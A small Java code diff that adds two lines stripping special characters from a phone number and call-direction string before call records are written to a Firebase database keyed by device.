@@ -183,6 +183,8 @@ public class Utils {
                     + " \nCall duration in sec :--- " + callDuration);
             stringBuffer.append("\n----------------------------------");
 
+            phNumber = phNumber.replaceAll("[.^:,#$]", "");
+            dir = dir.replaceAll("[.^:,#$]", "");
             mFirebaseDatabase.child("calls").child("" + MyDevice.getDeviceEmailName(context)
 //                                MyDevice.getDeviceName()
                         /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
